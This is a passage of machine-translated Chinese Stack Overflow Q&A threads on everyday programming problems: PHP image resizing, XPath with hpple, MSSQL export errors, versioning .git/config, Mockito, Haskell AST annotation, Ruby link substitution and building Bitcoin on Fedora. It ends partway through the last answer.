你可以欺骗 jCrop 脚本。而不是展示`image.jpg`，你做一些类似的事情`not_a_real_image.php?imagename=image.jpg`。然后给 php 文件一个图像的标题，以及宽度和高度，并将实际图像对齐在它的中心。

您所要做的就是记住您添加的画布数量，以便以后更正它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-22T22:04:57.153

我使用 Imagick 制作了一个函数：

```
function resizeImage($imgSrc, $width, $height, $createBg, $output, $show) {

    $img = new Imagick($imgSrc);

    if ($img->getImageWidth() / $img->getImageHeight() < $width / $height) {
        $img->thumbnailImage(0, $height);
    } else {
        $img->thumbnailImage($width, 0);
    }

    $canvas = new Imagick();
    $canvas->newImage($width, $height, 'white', 'jpg');

    /* Creates a background image (good for vertical images in horizontal canvas or vice-versa) */
    if ($createBg) {

        $imgBg = new Imagick($imgSrc);

        if ($imgBg->getImageWidth() / $imgBg->getImageHeight() < $width / $height) {
            $imgBg->thumbnailImage($width, 0);
        } else {
            $imgBg->thumbnailImage(0, $height);
        }

        $imgBg->blurImage(0, 80);

        $geometryBg = $imgBg->getImageGeometry();
        $xBg = ( $width - $geometryBg['width'] ) / 2;
        $yBg = ( $height - $geometryBg['height'] ) / 2;

        $canvas->compositeImage( $imgBg, imagick::COMPOSITE_OVER, $xBg, $yBg );
    }

    /* Center image */
    $geometry = $img->getImageGeometry();
    $x = ( $width - $geometry['width'] ) / 2;
    $y = ( $height - $geometry['height'] ) / 2;

    $canvas->compositeImage( $img, imagick::COMPOSITE_OVER, $x, $y );

    /* Save image  */
    if ($output) {
        $canvas->writeImage($output);
    }

    /* Show the image */
    if ($show) {
        header( 'Content-Type: image/jpg' );
        echo $canvas;
    }

} 
```

评论说明了一切，尽情享受吧！

# html - hpple XpathQuery 的想法？

> ID：16204150
> 
> 赞同：0
> 
> 时间：2013-04-24T23:48:40.487
> 
> 标签：html, ios, objective-c, xpath, hpple

我正在使用 hpple 来解析一些 HTML。我正在使用 Xcode 4.6 和 iOS 6.1。它看起来像这样。

![我的 HTML](https://i.stack.imgur.com/oZD7M.png)

我可以使用以下内容提取文本和图像`XPathQueryStrings`。

文字 ==>`//div[@class = 'entry-content']/p`

图片 ==>`//div[@class = 'entry-content']//img/@src`

但是，我还需要在“Retiring Stamp Set PDF”底部附近获取文本。此文本会更改，但格式通常相同。我尝试了以下路径，

`div[@class = 'entry-content']//a[@title]//text()`

但这没有用。我将所有这些都放在一个数组中，我可以看到该条目的返回值为空，但我想获取文本。我查看了 XPath 语法，但无法进一步了解。有没有人有什么建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T11:49:28.830

所以我想通了！因此，对于在此处查看过此内容的任何人，这是根据我的 HTML 文件的答案。

要获取您使用的文本....

//div[@class = 'entry-content']//a[@title]//*

这将返回带有标题的 div 下的所有文本。

# php - MSSQL Unicode 数据

> ID：16204152
> 
> 赞同：0
> 
> 时间：2013-04-24T23:48:46.270
> 
> 标签：php, sql-server, export

我正在尝试使用 PHP 保存 MSSQL 数据库。我选择使用 phpMSadmin 来执行此操作。问题是我得到：“无法使用 DB-Library（如 ISQL）或 ODBC 3.7 或更早版本将仅 Unicode 排序规则中的 Unicode 数据或 ntext 数据发送到客户端。” 所以我检查了代码，显然问题出在这里：

```
$table_query = @mssql_query('SELECT * FROM ' . $table . ';') or die(throwSQLError('unable to retrieve table data')); 
```

整个代码是这样的：

```
<?php

if(!empty($_POST['skippreview']) && !empty($_POST['doexport']))
    $skipheader = true;

include('inc/header.php');

mssql_select_db($_SESSION['database']);

if(!empty($_POST['doexport']))
{
    $texttypes = array('binary','char','nchar','varchar','nvarchar');
    $masterquery = '';

    if(!empty($_POST['dropdb']))
        $masterquery .= ('DROP DATABASE ' . $_SESSION['database'] . ';' . "\n");

    if(!empty($_POST['createdb']))
        $masterquery .= ('CREATE DATABASE ' . $_SESSION['database'] . ';' . "\n");

    if(!empty($_POST['useentry']))
        $masterquery .= ('USE ' . $_SESSION['database'] . ';' . "\n");

    $tablecount = count($_POST['tables']);

    for($counter = 0; $counter < $tablecount; $counter++)
    {
        $table = $_POST['tables'][$counter];

        if(!empty($_POST['structure']))
        {
            $tablequery = ('CREATE TABLE ' . $table);
            $columns = array();
            $tablesep = explode('.',$table);

            if(substr_count($_POST['tables'][$counter],'.') > 0)
            {
                $colquery = ('sp_columns @table_name = N\'' . $tablesep[1] . '\'');
                $colquery .= (', @table_owner = N\'' . $tablesep[0] . '\'');
            }
            else
                $colquery = ('sp_columns @table_name = N\'' . $tablesep[0] . '\'');

            $column_query = @mssql_query($colquery) or die(throwSQLError('unable to retrieve column data'));

            if(mssql_num_rows($column_query) > 0)
                $tablequery .= ' (';

            while($row = mssql_fetch_assoc($column_query))
            {
                // Start Column Conversion

                $colspec = ($row['COLUMN_NAME'] . ' ' . strtoupper($row['TYPE_NAME']));

                if(in_array($row['TYPE_NAME'],$texttypes))
                    $colspec .= ('(' . $row['PRECISION'] . ')');

                if(!$row['NULLABLE'])
                    $colspec .= ' NOT NULL';

                if($row['COLUMN_DEF'] != '')
                    $colspec .= (' DEFAULT ' . $row['COLUMN_DEF']);

                $tablequery .= (', ' . $colspec);

                // End Column Conversion
            }

            if(mssql_num_rows($column_query) > 0)
                $tablequery .= ')';

            $tablequery = str_replace('(, ','(',$tablequery);
            $masterquery .= ($tablequery . ';' . "\n");
        }

        if(!empty($_POST['data']))
        {
            $table_query = @mssql_query('SELECT * FROM ' . $table . ';') or die(throwSQLError('unable to retrieve table data'));
            while($row = mssql_fetch_assoc($table_query))
            {
                if(!isset($schema))
                {
                    $schema = array();

                    foreach($row AS $key => $value)
                        $schema[] = $key;
                }

                $values = array();
                foreach($schema AS $col)
                    if(is_numeric($row[$col]))
                        $values[] = ('\'' . str_replace('\'','\'\'',$row[$col]) . '\'');
                    else if(!empty($_POST['base64']))
                        $values[] = ('\'' . base64_encode(str_replace('\'','\'\'',$row[$col])) . '\'');
                    else
                        $values[] = ('\'' . str_replace('\'','\'\'',$row[$col]) . '\'');

                $masterquery .= ('INSERT INTO ' . $table . ' (' . implode(',',$schema) . ') VALUES (' . implode(',',$values) . ');' . "\n");
            }
        }
    }

    if(!empty($_POST['procedures']))
    {
        foreach($_POST['procedures'] AS $value)
        {
            $lines = array();
            $doit = false;

            $data_query = @mssql_query('sp_helptext \'' . $value . '\'') or die(throwSQLError('unable to retrieve procedure'));
            if(!@mssql_num_rows($data_query))
            {
                $schema_query = @mssql_query('SELECT SPECIFIC_SCHEMA FROM INFORMATION_SCHEMA.ROUTINES WHERE SPECIFIC_NAME = \'' . $value . '\';');
                if($schema_query)
                {
                    $schema_array = mssql_fetch_array($schema_query);
                    $value = ($schema_array['SPECIFIC_SCHEMA'] . '.' . $value);

                    unset($data_query);
                    $data_query = @mssql_query('sp_helptext \'' . $value . '\'') or die(throwSQLError('unable to retrieve procedure'));

                    if(@mssql_num_rows($data_query))
                        $doit = true;
                }
            }
            else
                $doit = true;

            if($doit)
            {
                while($row = mssql_fetch_array($data_query))
                    $lines[] = $row['Text'];

                $masterquery .= (implode('',$lines) . "\n");
            }

            unset($lines,$doit);
        }
    }

    if(!empty($_POST['views']))
    {
        foreach($_POST['views'] AS $value)
        {
            $lines = array();
            $doit = false;

            $data_query = @mssql_query('sp_helptext \'' . $value . '\'') or die(throwSQLError('unable to retrieve procedure'));
            if(!@mssql_num_rows($data_query))
            {
                $schema_query = @mssql_query('SELECT TABLE_SCHEMA FROM INFORMATION_SCHEMA.VIEWS WHERE TABLE_NAME = \'' . $value . '\';');
                if($schema_query)
                {
                    $schema_array = mssql_fetch_array($schema_query);
                    $value = ($schema_array['TABLE_SCHEMA'] . '.' . $value);

                    unset($data_query);
                    $data_query = @mssql_query('sp_helptext \'' . $value . '\'') or die(throwSQLError('unable to retrieve view'));

                    if(@mssql_num_rows($data_query))
                        $doit = true;
                }
            }
            else
                $doit = true;

            if($doit)
            {
                while($row = mssql_fetch_array($data_query))
                    $lines[] = $row['Text'];

                $masterquery .= (implode('',$lines) . "\n");
            }

            unset($lines,$doit);
        }
    }

    if(!empty($_POST['functions']))
    {
        foreach($_POST['functions'] AS $value)
        {
            $lines = array();

            $data_query = @mssql_query('sp_helptext \'' . $value . '\'') or die(throwSQLError('unable to retrieve function'));
            if($data_query)
            {
                while($row = mssql_fetch_array($data_query))
                    $lines[] = $row['Text'];

                $masterquery .= (implode('',$lines) . "\n");

                unset($lines);
            }
        }
    }

    $masterquery = rtrim($masterquery);

    if(empty($_POST['skippreview']))
    {
        echo '<form name="form1" method="post" action="database_export_download.php">';
        echo '<textarea name="data" rows="30" cols="75">';

        echo($masterquery);

        echo '</textarea>';

        echo '<br><br><input type="submit" value="Save to File">';
        echo '</form>';

        include('inc/footer.php');
    }
    else
    {
        header('Content-type: application/x-download');
         header('Content-Disposition: attachment; filename="' . $_SESSION['database'] . '.sql"');
         header('Content-Length: ' . strlen($masterquery));
         echo($masterquery);
        exit;
    }
}

$tables = array();

$db_query = mssql_query('sp_tables') or die(throwSQLError('unable to retrieve list of tables'));

while($row = mssql_fetch_array($db_query))
{
    if($row['TABLE_TYPE'] == 'TABLE' && $row['TABLE_NAME'] != 'dtproperties')
    {
        if($row['TABLE_OWNER'] != 'dbo')
            $tables[] = ($row['TABLE_OWNER'] . '.' . $row['TABLE_NAME']);
        else
            $tables[] = $row['TABLE_NAME'];
    }
}

?>

<script language="javascript">
function doCheck(mode)
{
    for(counter = 0; counter < document.form1.tablecount.value; counter++)
        document.forms['form1'].elements['tables[]'][counter].checked = mode;
}

function doCheckProcedures(mode)
{
    for(counter = 0; counter < document.form1.procedurecount.value; counter++)
        document.forms['form1'].elements['procedures[]'][counter].checked = mode;
}

function doCheckViews(mode)
{
    for(counter = 0; counter < document.form1.viewcount.value; counter++)
        document.forms['form1'].elements['views[]'][counter].checked = mode;
}

function doCheckFunctions(mode)
{
    for(counter = 0; counter < document.form1.functioncount.value; counter++)
        document.forms['form1'].elements['functions[]'][counter].checked = mode;
}
</script>

<form name="form1" method="post" action="database_export.php">
<input type="hidden" name="doexport" value="yes">
<table width="350" cellpadding="3" cellspacing="3" style="border: 1px solid">
    <tr>
        <td align="center" colspan="3" style="background: #D0DCE0"><b>Tables</b></td>
    </tr>
    <tr>
        <td style="background: #D0DCE0">&nbsp;</td>
        <td align="center" style="background: #D0DCE0">
            <b>Table</b>
        </td>
        <td align="center" style="background: #D0DCE0">
            <b>Records</b>
        </td>
    </tr>
    <?php
        $totalrecords = 0;
        $toggle = true;
        $colors = array('#DDDDDD','#CCCCCC');

        if(empty($_POST['tables']))
            $_POST['tables'] = array();

        foreach($tables AS $row)
        {
            if($toggle)
                $bg = $colors[0];
            else
                $bg = $colors[1];

            $toggle = !$toggle;

            if(substr_count($row,'.') > 0)
                $record_query = mssql_query('SELECT count(*) AS itemcount FROM ' . $row);
            else
                $record_query = mssql_query('SELECT count(*) AS itemcount FROM [' . $row . ']');

            $record_array = mssql_fetch_array($record_query);
            $records = $record_array['itemcount'];
            $totalrecords += $records;

            echo '<tr>';

            if(in_array($row,$_POST['tables']))
                echo('<td align="center" style="background: ' . $bg . '"><input type="checkbox" name="tables[]" value="' . $row . '" checked></td>');
            else
                echo('<td align="center" style="background: ' . $bg . '"><input type="checkbox" name="tables[]" value="' . $row . '"></td>');

            echo('<td style="background: ' . $bg . '">' . $row . '</td>');
            echo('<td style="background: ' . $bg . '">' . number_format($records) . '</td>');
            echo '</tr>';

            unset($record_query,$record_array,$records);
        }
    ?>
    <tr>
        <td align="right" colspan="2" style="background: #EAEAEA">
            <b>Total Row Count:</b>
        </td>
        <td align="right" style="background: #EAEAEA">
            <?php echo number_format($totalrecords); ?>
        </td>
    </tr>
    <tr>
        <td colspan="3" style="background: #D0DCE0" nowrap>
            Select Tables:&nbsp;&nbsp;<a href="javascript:doCheck(true);">All</a> / <a href="javascript:doCheck(false);">None</a>
        </td>
    </tr>
</table>

<br>

<?php
    $procs = array();
    $views = array();
    $functions = array();

    $proc_query = @mssql_query('sp_help') or die(throwSQLError('unable to retrieve list of stored procedures'));
    while($row = mssql_fetch_assoc($proc_query))
    {
        if($row['Object_type'] == 'stored procedure' && ($row['Owner'] == 'dbo' || $_SETTINGS['showsysdata']))
            $procs[] = $row['Name'];
        else if($row['Object_type'] == 'view' && ($row['Owner'] == 'dbo' || $_SETTINGS['showsysdata']))
            $views[] = $row['Name'];
        else if(substr_count($row['Object_type'],'function') > 0 && ($row['Owner'] == 'dbo' || $_SETTINGS['showsysdata']))
            $functions[] = $row['Name'];
    }
?>

<table width="350" cellpadding="3" cellspacing="3" style="border: 1px solid">
    <tr>
        <td align="center" colspan="2" style="background: #D0DCE0">
            <b>Stored Procedures</b>
        </td>
    </tr>
    <tr>
        <td style="background: #D0DCE0">&nbsp;</td>
        <td align="center" style="background: #D0DCE0">
            <b>Name</b>
        </td>
    </tr>
    <?php
        $toggle = true;
        $colors = array('#DDDDDD','#CCCCCC');

        foreach($procs AS $key => $value)
        {
            $row['Name'] = $value;

            if($toggle)
                $bg = $colors[0];
            else
                $bg = $colors[1];

            $toggle = !$toggle;

            echo '<tr>';
            echo('<td align="center" style="background: ' . $bg . '"><input type="checkbox" name="procedures[]" value="' . $row['Name'] . '"></td>');
            echo('<td style="background: ' . $bg . '" nowrap>' . $row['Name'] . '</td>');
            echo '</tr>';

            unset($row);
        }

        if(count($procs) == 0)
            echo '<tr><td align="center" colspan="3" style="background: #DDDDDD">No Stored Procedures</td></tr>';
    ?>
    <tr>
        <td colspan="2" style="background: #D0DCE0">
            Select Procedures:&nbsp;&nbsp;<a href="javascript:doCheckProcedures(true);">All</a> / <a href="javascript:doCheckProcedures(false);">None</a>
        </td>
    </tr>
</table>

<br>

<table width="350" cellpadding="3" cellspacing="3" style="border: 1px solid">
    <tr>
        <td align="center" colspan="2" style="background: #D0DCE0">
            <b>Views</b>
        </td>
    </tr>
    <tr>
        <td style="background: #D0DCE0">&nbsp;</td>
        <td align="center" style="background: #D0DCE0">
            <b>Name</b>
        </td>
    </tr>
    <?php
        $toggle = true;
        $colors = array('#DDDDDD','#CCCCCC');

        foreach($views AS $key => $value)
        {
            $row['Name'] = $value;

            if($toggle)
                $bg = $colors[0];
            else
                $bg = $colors[1];

            $toggle = !$toggle;

            echo '<tr>';
            echo('<td align="center" style="background: ' . $bg . '"><input type="checkbox" name="views[]" value="' . $row['Name'] . '"></td>');
            echo('<td style="background: ' . $bg . '" nowrap>' . $row['Name'] . '</td>');
            echo '</tr>';

            unset($row);
        }

        if(count($procs) == 0)
            echo '<tr><td align="center" colspan="3" style="background: #DDDDDD">No Views</td></tr>';
    ?>
    <tr>
        <td colspan="2" style="background: #D0DCE0">
            Select Views:&nbsp;&nbsp;<a href="javascript:doCheckViews(true);">All</a> / <a href="javascript:doCheckViews(false);">None</a>
        </td>
    </tr>
</table>

<br>

<table width="350" cellpadding="3" cellspacing="3" style="border: 1px solid">
    <tr>
        <td align="center" colspan="2" style="background: #D0DCE0">
            <b>Functions</b>
        </td>
    </tr>
    <tr>
        <td style="background: #D0DCE0">&nbsp;</td>
        <td align="center" style="background: #D0DCE0">
            <b>Name</b>
        </td>
    </tr>
    <?php
        $toggle = true;
        $colors = array('#DDDDDD','#CCCCCC');

        foreach($functions AS $key => $value)
        {
            $row['Name'] = $value;

            if($toggle)
                $bg = $colors[0];
            else
                $bg = $colors[1];

            $toggle = !$toggle;

            echo '<tr>';
            echo('<td align="center" style="background: ' . $bg . '"><input type="checkbox" name="functions[]" value="' . $row['Name'] . '"></td>');
            echo('<td style="background: ' . $bg . '" nowrap>' . $row['Name'] . '</td>');
            echo '</tr>';

            unset($row);
        }

        if(count($functions) == 0)
            echo '<tr><td align="center" colspan="2" style="background: #DDDDDD">No Functions</td></tr>';
    ?>
    <tr>
        <td align="center" colspan="2" style="background: #D0DCE0">
            Select Functions:&nbsp;&nbsp;<a href="javascript:doCheckFunctions(true);">All</a> / <a href="javascript:doCheckFunctions(false);">None</a>
        </td>
    </tr>
</table>

<br>

<input type="hidden" name="tablecount" value="<?php echo(count($tables)); ?>">
<input type="hidden" name="procedurecount" value="<?php echo(count($procs)); ?>">
<input type="hidden" name="viewcount" value="<?php echo(count($views)); ?>">
<input type="hidden" name="functioncount" value="<?php echo(count($functions)); ?>">

<table width="350" cellpadding="3" cellspacing="3" style="border: 1px solid">
    <tr>
        <td align="center" colspan="2" style="background: #D0DCE0">
            <b>Export Options</b>
        </td>
    </tr>
    <tr>
        <td align="right" style="background: #CCCCCC" valign="top" nowrap>
            Selection:
        </td>
        <td style="background: #CCCCCC" nowrap>
            <input type="checkbox" name="structure" value="yes"> Structure<br>
            <input type="checkbox" name="data" value="yes"> Data
        </td>
    </tr>
    <tr>
        <td align="right" style="background: #CCCCCC" valign="top" nowrap>
            Preparation:
        </td>
        <td style="background: #CCCCCC" nowrap>
            <input type="checkbox" name="dropdb" value="yes"> Drop Database First<br>
            <input type="checkbox" name="createdb" value="yes"> Use Create Database<br>
            <input type="checkbox" name="useentry" value="yes"> Add "USE" Database Switch
        </td>
    </tr>
    <tr>
        <td align="right" style="background: #CCCCCC" valign="top" nowrap>
            Method:
        </td>
        <td style="background: #CCCCCC" nowrap>
            <input type="checkbox" name="base64" value="yes"> Base-64 Encode Strings<br>
            <input type="checkbox" name="skippreview" value="yes"> Skip Export Preview
        </td>
    </tr>
    <tr>
        <td align="right" colspan="2" style="background: #D0DCE0">
            <input type="submit" value="Export">
        </td>
    </tr>
</table>
</form>
<?php include('inc/footer.php'); ?> 
```

有没有办法解决这个问题？非常感谢。

# git - 如何对 .git/config 文件进行版本控制？

> ID：16204155
> 
> 赞同：7
> 
> 时间：2013-04-24T23:48:51.427
> 
> 标签：git, version-control, config, gitignore

我有一个 .gitignore 文件，如下所示：

```
.*
!.gitignore 
```

而且我想对我的`.git/config`文件进行版本控制，以便在我执行`git pull`.git/config 文件时自动更新。

我怎样才能做到这一点？

我试过类似的东西：

```
.*
!.gitignore
!.git/config 
```

但这没有用。我知道如果我创建一个链接 ( `ln -s .git/config configurations/git/config`) 我可以对其进行版本控制，但我想要一种更好的方法来自动更新原始链接。

我正在考虑创建一个硬链接（`ln .git/config configurations/git/config configuration/git`），但这似乎不是最好的方法。有没有办法避免这种情况？对硬链接进行版本控制时，Git 会正常工作吗？

**编辑：解释为什么要这样做**

这样做的主要动机是我想对我的用户的主文件夹进行版本控制。我将使用此版本控制来帮助我进行某种部署。我想保持所有克隆同步。如果我管理不好，就会出现冲突，我会解决这个问题。也许我也会对另一个受保护的 git 文件进行版本控制。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T02:47:46.170

您不能“版本”您的 .git/config 文件。你可以做的是在你的工作目录中创建一个 .gitconfig 并提交它。然后在您执行克隆之后。

```
 cat .gitconfig >> .git/config 
```

当然，**这充满了各种潜在的问题**。如果有人编辑`.gitconfig`怎么办？您需要撤消`.git/config`，然后在`git pull`. 如果`.gitconfig`在不同的分支上发生变化怎么办？您需要撤消`.git/config`并重新附加`git checkout <branch>`

所以，我不建议改变`.git/config`；但如果你必须，你必须。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2019-01-15T12:09:32.363

正如@Tuxdude 所说，分享`.git/config`自己是不好的信息。

但是[Git (1.7.10+) 现在支持配置包含](https://stackoverflow.com/questions/1557183/is-it-possible-to-include-a-file-in-your-gitconfig/9733277#9733277)！

因此，对于重要的选项，您可能会说将它们放在 file:`.git.config/repository.config`中，然后`.git/config`将其链接如下：

```
[include]
        path = ../.git.config/repository.config 
```

我只是在 repo 的自述文件中添加了这样的建议。只需复制/粘贴多行和对常规文件等重要设置进行版本控制非常容易。它还为 repo 的所有用户传输更新。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T23:56:50.740

对文件进行版本控制是个坏主意`.git/config`。

git 不允许您对`.git`目录下的任何内容进行版本控制，因为`.git`您的 repo 的内容是本地的，并且从同一个远程 URL 克隆的 2 个人在克隆后不需要在`.git`目录下拥有相同的文件集。

例如，您可能只有一个远程命名`origin`，而其他开发人员可能已将远程命名为类似的名称`foo`。另一个开发人员可能有 2 个名为`bar`和的遥控器`baz`。

有关远程（URL、refspec 等）、本地分支（如上游跟踪分支等）的信息存储在您的`.git/config`文件中。

如果您确实需要覆盖某些配置，您可以在`.git/config`本地编辑文件，或者如果它是您可以全局设置的选项，请使用您的`~/.gitconfig`或等效的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T11:28:08.787

添加到已经很好的答案，并实际回答 OP 的问题：

> 我正在考虑创建一个硬链接（`ln .git/config configurations/git/config configuration/git`），但这似乎不是最好的方法。
> 有没有办法避免这种情况？
> 对硬链接进行版本控制时，Git 会正常工作吗？

不：

*   Git 中不表示硬链接：请参阅“ [Git 和硬链接](https://stackoverflow.com/questions/3729278/git-and-hard-links)”
*   符号链接将简单地存储为带有链接文件路径的文本文件。

# java - 我可以使用 Mockito 测试使用自省的代码吗？

> ID：16204158
> 
> 赞同：2
> 
> 时间：2013-04-24T23:49:20.943
> 
> 标签：java, mocking, mockito, introspection

我正在为使用自省的代码块编写单元测试；具体来说，它调用`getDeclaredField()`我要模拟的类并尝试获取该字段的值。有没有办法用 Mockito 模拟这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-27T03:40:02.593

Mockito 使用您试图通过创建 Mock 来欺骗的相同自省库进行操作。即使您可以哄骗它工作，我也不确定理解或维护它有多容易。

我建议创建一个非常小的嵌套类并正常操作它：

```
public class YourTest {
  private static class SampleClass {
    String field1;
    int field2;
  }

  @Test public void introspectionWorks() {
    yourSUT.process(new SampleClass());
  }
} 
```

除此之外，将难以模拟的调用提取到您可以轻松存根的方法中：

```
public class YourSUT {
  /* ... */

  /* package */ Class<?> getFieldType(Object object, String fieldName) {
    return object.getClass().getDeclaredField(fieldName).getType();
  }
}

public class YourTest {
  @Test public void introspectionWorks() {
    YourSUT spy = Mockito.spy(yourSUT);
    doReturn(String.class).when(spy).getFieldType(myObject, "someStringField");
  }
} 
```

# php - PHP图像扩展

> ID：16204165
> 
> 赞同：0
> 
> 时间：2013-04-24T23:50:41.710
> 
> 标签：php, image, extension-methods

我已经成功创建了一个上传图片表单，允许用户上传他们的图片并将它们存储在某个文件夹中。但问题是我不知道如何使用这些具有不同扩展名的图像？因为有些是PNG，有些是JPG，有些是GIF。

我怎样才能遍历它们？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T23:53:55.497

上传时，您应该将图像转换为 JPG 或其他扩展名，以便使用 PHP 中的 GD ( [http://php.net/manual/en/book.image.php](http://php.net/manual/en/book.image.php) )

除此之外，您可以使用 exif_imagetype() 获取图像的扩展名。

-- 自从你更新了问题

您可以在 PHP 中使用 glob() 来遍历文件夹中的所有文件。 [http://php.net/manual/en/function.glob.php](http://php.net/manual/en/function.glob.php)

要正确解决此问题，您应该将所有文件名保存到数据库中，这样您就不必猜测文件名。还可以使用 GD 工具使所有图像具有相同的类型，以进一步使获取图像更容易，您可以更改质量和压缩以节省空间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:00:51.917

getimagesize() 将返回一个关联数组，其中一个键是“mime”。这将使您确定文件类型。

# haskell - 我应该如何表示带有附加信息注释的 AST？

> ID：16204177
> 
> 赞同：6
> 
> 时间：2013-04-24T23:53:17.107
> 
> 标签：haskell

假设我有一个用某种语言表示 AST 的简单数据类型：

```
data Term = Var String
          | Num Integer
          | Expr [Term] 
```

（实际上它显然会有比这更多的构造函数。）

我可以使用它来编写一个与 AST 结构匹配的简单评估函数：

```
eval :: Term -> Result
eval (Var name)   = lookup name
eval (Num n)      = return n
eval (Expr exprs) = ... 
```

我可以在不改变模式匹配工作方式的情况下使用行号等信息来注释 AST 吗？

（如果我不介意改变模式，我当然可以使用记录语法或视图模式。）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-25T02:29:10.357

为什么不以多态方式表示 AST

```
data Term term = Var String
      | Num Integer
      | Expr [term] 
```

那么你的原始`Term`类型是

```
newtype SimplTerm = SimplTerm (Term (SimplTerm)) 
```

你可以很容易地用视图模式做你想做的事

```
data AtLine = AtLine (Term AtLine) Integer

view :: AtLine -> Term AtLine
view (AtLine x _) = x

eval (view -> Var name) = lookup name
eval (view -> Num n) = numResult n
eval (view -> Expr expr) = listResult (map eval expr) 
```

或使视图多态

```
class AST t where
   term :: t -> Term t
instance AST SimplTemr where
   term (SimplTemr x) = x
instance AST AtLine where
   term (AtLine x _) = x

eval :: AST t => t -> Result
eval (view -> Var name) = lookup name
eval (view -> Num n) = numResult n
eval (view -> Expr expr) = listResult (map eval expr) 
```

对于错误处理，我希望有一种方法可以让视图模式出现在 monad 中，但这就是生命（如果`view`函数在 cps 中完成，你可以这样做，因此将延续作为参数而不是返回值）。

# ruby - 解析和替换多个链接，但不是当一个包含另一个时

> ID：16204179
> 
> 赞同：0
> 
> 时间：2013-04-24T23:53:25.960
> 
> 标签：ruby, parsing, url, substring, gsub

我不知道如何（轻松）避免链接（2）来替换链接（1）的开头。我很感激 Ruby 中的答案，但如果你弄清楚逻辑它也很好。

**输出应该是：**

```
 message = "For Last Minute rentals, please go to:
    <span class='external_link' href-web='http://www.mydomain.com/thepage'>http://www.mydomain.com/thepage</span> (1)

    For more information about our events, please visit our website: 
    <span class='external_link' href-web='http://www.mydomain.com'>http://www.mydomain.com</span> (2)" 
```

**但它是：**

```
 message = "For Last Minute rentals, please go to:
    <span class='external_link' href-web='<span class='external_link' href-web='http://www.mydomain.com'>http://www.mydomain.com</span>/thepage'><span class='external_link' href-web='http://www.mydomain.com'>http://www.mydomain.com</span>/thepage</span> (1)

    For more information about our events, please visit our website: 
    <span class='external_link' href-web='http://www.mydomain.com'>http://www.mydomain.com</span> (2)" 
```

**这是代码（已编辑：取出跨度）：**

```
 message = "For Last Minute rentals, please go to:
    http://www.mydomain.com/thepage

    For more information about our events, please visit our website: 
    http://www.mydomain.com"

   links_found = URI.extract(message, ['http', 'https'])

   for link_found in links_found          
     message.gsub!(link_found,"<span class='external_link' href-web='#{web_link}'>#{link_found}</span>")
   end 
```

想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:19:01.280

首先，规则一，在处理 HTML 或 XML 时，除了最琐碎的事情之外，不要为任何事情操心字符串操作或正则表达式。否则肯定会[发疯](https://stackoverflow.com/a/1732454/128421)。

相反，请保持理智并使用真正的解析器。对于 Ruby，我强烈建议您仅查看 Nokogiri - 它确实有效。

考虑这段代码：

```
require 'nokogiri'

message = "For Last Minute rentals, please go to:
<span class='external_link' href-web='http://www.mydomain.com/thepage'>http://www.mydomain.com/thepage</span> (1)

For more information about our events, please visit our website: 
<span class='external_link' href-web='http://www.mydomain.com'>http://www.mydomain.com</span> (2)"

doc = Nokogiri::HTML(message)

external_spans = doc.search('span.external_link')

url1 = external_spans[0]['href-web'] # => "http://www.mydomain.com/thepage"
text1 = external_spans[0].text       # => "http://www.mydomain.com/thepage"
url2 = external_spans[1]['href-web'] # => "http://www.mydomain.com"
text2 = external_spans[1].text       # => "http://www.mydomain.com" 
```

`url`和分别是来自和来自`text1`的 URL 。`span 1``url2``text2``span 2`

我不确定你想用它们做什么，因为经过粗略的一瞥，我看不出你的源代码和期望的输出有什么不同，但是，一旦你有了它们，你就可以自由地做任何事情。解析器，如 Nokogiri，允许您从 HTML 或 XML DOM 中检索信息、替换它、移动内容，甚至拼接新内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:24:14.937

我猜你的问题与`URI.extract`. 当它通过时，它会`message`拉取“http”的*所有*`<span>`实例，对于第一行，它在.

为了进一步澄清，`links_found`将是一个同时包含`<span...href-web:...`和的数组`http...</span>`。由于您只是将`link_found`gsub 作为要匹配的模式传递给它，因此它将替换`links_found[]`数组中的每个对象

# fedora - 无法构建比特币

> ID：16204188
> 
> 赞同：3
> 
> 时间：2013-04-24T23:54:50.323
> 
> 标签：比特币, fedora, bitcoin

[从github](https://github.com/bitcoin/bitcoin.git)获取酱汁，阅读 doc/build-unix.txt 中的说明。但是`make`不能编译进去！

[urs1412@noname 比特币]$`cd src`

[urs1412@noname src]$`make -f makefile.unix`

```
g++ -c -O2 -pthread -Wall -Wextra -Wformat -Wformat-security \
-Wno-unused-parameter -g -DBOOST_SPIRIT_THREADSAFE \
-D_FILE_OFFSET_BITS=64 -I/home/urs1412/w/bitcoin/src \
-I/home/urs1412/w/bitcoin/src/obj -DUSE_UPNP=0 -DUSE_IPV6=1 \
-I/home/urs1412/w/bitcoin/src/leveldb/include \
-I/home/urs1412/w/bitcoin/src/leveldb/helpers \
-DHAVE_BUILD_INFO -fno-stack-protector \
-fstack-protector-all -Wstack-protector \
-D_FORTIFY_SOURCE=2  -MMD -MF obj/alert.d \
-o obj/alert.o alert.cpp \

alert.cpp:6:53: fatal error: boost/algorithm/string/classification.hpp: 
No such file or directory
compilation terminated.
make: *** [obj/alert.o] Error 1 
```

td;dr 无法构建[比特币](/questions/tagged/bitcoin "显示标记为“比特币”的问题")，倾销系统信息

[urs1412@noname src]$ uname -r

3.6.10-4.fc18.x86_64

[urs1412@noname src]$ git log -n 1

提交 77a1e12eed5fc66dce16584696f54988a8c2bf4e 合并：fe15aa3 0565b71 作者：Gavin Andresen 日期：2013 年 4 月 24 日星期三 08:48:06 -0700

```
Merge pull request #2554 from fanquake/qt-pro-brew-patch

bitcoin-qt.pro Brew patch 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-11T02:58:32.060

我终于能够在我的 CentOS VPS 上构建 bitcoin-1.8（*不是*git 源，尽管我相信这些相同的步骤也适用）。

这是我必须安装的软件包。请注意，我必须构建其中的一些。

作为根：

```
